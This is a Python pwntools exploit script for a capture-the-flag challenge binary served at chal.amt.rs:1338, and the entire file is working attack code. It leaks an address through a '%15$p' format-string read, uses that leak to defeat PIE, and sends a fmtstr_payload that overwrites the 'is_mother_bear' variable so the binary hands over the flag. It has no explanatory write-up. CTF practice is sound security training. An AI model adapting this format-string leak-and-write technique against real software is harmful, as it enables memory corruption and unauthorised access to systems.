#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
libc = './lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'chal.amt.rs', 1338

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./lib'

def exploit():
    global io
    io = initialize()

    io.sendlineafter(b'say', b'%15$p')
    io.recvuntil(b'0x')
    
    leak = int(io.recvuntil(b' ', drop=True), 16)
    elf.address = leak - 0x1678
    
    payload = fmtstr_payload(22, {
        elf.sym['is_mother_bear']: 0xbad0bad
    })
    io.sendlineafter(b'say', payload)

    io.sendlineafter(b'say', b'flag')

    info('leak: %#x', leak)
    info('elf base: %#x', elf.address)
    info('mother bear: %#x', elf.sym['is_mother_bear'])
    io.interactive()
    
if __name__ == '__main__':
    exploit()